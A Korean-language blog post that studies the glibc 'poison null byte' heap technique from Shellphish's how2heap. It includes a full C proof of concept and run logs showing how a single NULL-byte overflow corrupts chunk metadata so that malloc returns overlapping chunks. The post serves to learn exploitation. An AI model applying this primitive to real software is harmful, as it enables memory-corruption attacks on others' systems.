---
layout: post
title: "Poison NULL byte"
date: 2016-06-13 16:46:53 +0900
comments: true
categories: 
---

[Shellphish 가 쓴 힙 공격 문서중에 하나, Poison NULL byte](https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c) 를 읽고 정리한다.

* 참고 문서: [Glibc Adventures: The Fogotten Chunks](http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf)

우선 a,b,c 를 차례로 alloc 한다.

Ubuntu 에서 0x100 을 을 alloc 하고, `malloc_usable_size()` 를 해보면, 0x108 이 나온다. Rounding 때문인지, 요청한 것보다 메모리 영역이 더 잡혔다.

```
a = (uint8_t*)malloc(0x100);
b = (uint8_t*)malloc(0x200);
c = (uint8_t*)malloc(0x100);
```

* 이제 `uint64_t* b_size_ptr = (uint64_t*)(b-8);` 을 통해서, `struct malloc_chunk` 구조체 멤버인 `INTERNAL_SIZE_T size;` 를 가리키는 포인터를 만든다.

* 이 구조체를 이용해 b.size 를 찍어볼 수가 있는데,

* 0x211 로 나온다. `(0x200 + 0x10) | prev_in_use` 가 되는 것. 

* 이제 `a[real_a_size] = 0;`  을 통해서, b.size 의 하위 1 바이트를 0 으로 만든다.

* b.size 를 찍어보면 이제 0x210 으로 나온다.

* 이제 c.prev_size 를 찍어본다. b 를 free 했기때문에, 유효한 필드가 되버렸다. 찍으면 0x210 이 나온다.

* 이제 `b1 = malloc(0x100);` 을 한다. 그러면 예전 b 자리에 할당될 것이다.

만약 `a[real_a_size] = 0;` 을 안했다면, 다음과 같이 c.prev 가 제대로 update 되는데... (0x200 으로 앨록한 자리에 0x100 을 앨록했으니, c 앞에 free chunk 가 존재)

```
~ » ./a.out                                                              z@ubuntu
a: 0x1466010
real_a_size: 0x108
b: 0x1466120
real_b_size: 0x208
c: 0x1466330
addr of b_size_ptr: 0x1466118
b.size after free: 0x211
b.size is (0x200+0x10) | prev_in_use
addr of c_prev_size_ptr: 0x1466320
c.prev_size is 0x210
b1: 0x1466120
c.prev_size is 0x100
c' 0x100
c'' 0
```

`a[real_a_size] = 0;`... 즉 앞의 청크에서 NULL 바이트 오버플로우가 일어났다면... 그래서 b.size 의 하위 1 바이트를 0 으로 만들었다면 무슨 일이 벌어지는가? (`c'` 는 `c - 16`, `c''` 는 `c - 32`)

```
~ » ./a.out                                                              z@ubuntu
a: 0x1466010
real_a_size: 0x108
b: 0x1466120
real_b_size: 0x208
c: 0x1466330
addr of b_size_ptr: 0x1466118
b.size after free: 0x211
b.size is (0x200+0x10) | prev_in_use
addr of c_prev_size_ptr: 0x1466320
c.prev_size is 0x210
b1: 0x1466120
c.prev_size is 0x210
c' 0x210
c'' 0xf0
```

c.prev_size 가 제대로 update 되지 않는다. 0x210 -> 0x100 으로 줄어야하는데. 대신 엉뚱한데 0f0 이 써졌다.

정리하면, `a|b|c` 가 앨록된 상황에서, b 가 프리되고, a 가 overflow 되면서 b.size 의 1 바이트가 0 으로 바뀌었다. 그랬더니, 추후 앨록을 하니까 c 의 메타데이터가 연쇄반응으로 깨져버렸다.

이제,

* 현재 `a|b1|(free)|c` 로 앨록된 상황이다. c.prev_size 는 지나치게 크게 되어있다. b1 까지도 free 하다고 잘못 생각하고 있는 상황.

이제 `b2` 를 앨록한다.

* 그럼 `a|b1|b2|(free)|c` 로 앨록된 상황이다. 여전히 c.prev 는 잘못되어있다.

* 여기서 `free(b1); free(c);` 를 해준다음에 꽤 큰 사이즈를 `d` 로 앨록 요청하면, 상식적으로 `b2` 다음에 존재하던 free chunk 부터 앨록되어야 하나, 메모리 매니저는 `b == b1` 자리에 앨록한다. `d` 와 `b2` 가 overlapping 되는 셈.

* 이제 `d` 에다가 쓰인 데이터는 `b2` 가 가리키는 메모리를 를 corrupt 시킨다.

* 교훈은, malloc 에서 경계를 넘어가서, 1 바이트만 NULL 로 overwrite 되어도 메모리 커럽션이 일어날 수 있다는 것.

`b.size` 의 `prev_in_use` 가 overwrite 되지 않았을 경우,

소스.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;

	a = (uint8_t*) malloc(0x100);
	int real_a_size = malloc_usable_size(a);
	printf("a: %p\n",a);
	printf("real_a_size: %#x\n",real_a_size);

	b = (uint8_t*) malloc(0x200);
	int real_b_size = malloc_usable_size(b);
	printf("b: %p\n",b);
	printf("real_b_size: %#x\n",real_b_size);
	
	c = (uint8_t*) malloc(0x100);
	printf("c: %p\n",c);

	uint64_t* b_size_ptr = (uint64_t*)(b-8);
	printf("addr of b_size_ptr: %p\n",b_size_ptr);

	free(b);

	printf("b.size after free: %#lx\n",*b_size_ptr);
	printf("b.size is (0x200+0x10) | prev_in_use\n");

	a[real_a_size] = 0;
	printf("b.size after free: %#lx\n",*b_size_ptr);

	uint64_t* c_prev_size_ptr = (uint64_t*)(c-16);
	printf("addr of c_prev_size_ptr: %p\n",c_prev_size_ptr);
	
	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);

	b1 = malloc(0x100);
	printf("b1: %p\n",b1);

	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
	printf("c - 8 %#lx\n",*(((uint64_t*)c)-1));
	printf("c - 16 %#lx\n",*(((uint64_t*)c)-2));
	printf("c - 24 %#lx\n",*(((uint64_t*)c)-3));
	printf("c - 32 %#lx\n",*(((uint64_t*)c)-4));

	b2 = malloc(0x80);
	printf("b2: %p\n",b2);
	memset(b2,'B',0x80);
	printf("Current b2 content:\n%s\n",b2);

	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
	printf("c - 8 %#lx\n",*(((uint64_t*)c)-1));
	printf("c - 16 %#lx\n",*(((uint64_t*)c)-2));
	printf("c - 24 %#lx\n",*(((uint64_t*)c)-3));
	printf("c - 32 %#lx\n",*(((uint64_t*)c)-4));

	free(b1);
	free(c);
	d = malloc(0x300);
	printf("d: %p\n",d);

	memset(d,'D',0x300);

	printf("New b2 content:\n%s\n",b2);
}
```

실행결과.

```
~ » ./a.out                                                      z@ubuntu
a: 0x12f4010
real_a_size: 0x108
b: 0x12f4120
real_b_size: 0x208
c: 0x12f4330
addr of b_size_ptr: 0x12f4118
b.size after free: 0x211
b.size is (0x200+0x10) | prev_in_use
addr of c_prev_size_ptr: 0x12f4320
c.prev_size is 0x210
b1: 0x12f4120
c.prev_size is 0x100
c - 8 0x110
c - 16 0x100
c - 24 0
c - 32 0
b2: 0x12f4230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
c.prev_size is 0x70
c - 8 0x110
c - 16 0x70
c - 24 0
c - 32 0
d: 0x12f42c0
New b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

이번에는 `b.size` 의 `prev_in_use` 가 corrupt 되었을 경우, `b2` 가 `D` 로 바뀌었는데, malloc 이 overlapping 하게 만들어져서, 다른 메모리에 대한 memset 의 사이드이펙트로 corrupt 됨을 알 수 있다.

```
a: 0x1655010
real_a_size: 0x108
b: 0x1655120
real_b_size: 0x208
c: 0x1655330
addr of b_size_ptr: 0x1655118
b.size after free: 0x211
b.size is (0x200+0x10) | prev_in_use
b.size after free: 0x200
addr of c_prev_size_ptr: 0x1655320
c.prev_size is 0x210
b1: 0x1655120
c.prev_size is 0x210
c - 8 0x110
c - 16 0x210
c - 24 0
c - 32 0xf0
b2: 0x1655230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
c.prev_size is 0x210
c - 8 0x110
c - 16 0x210
c - 24 0
c - 32 0x60
d: 0x1655120
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```
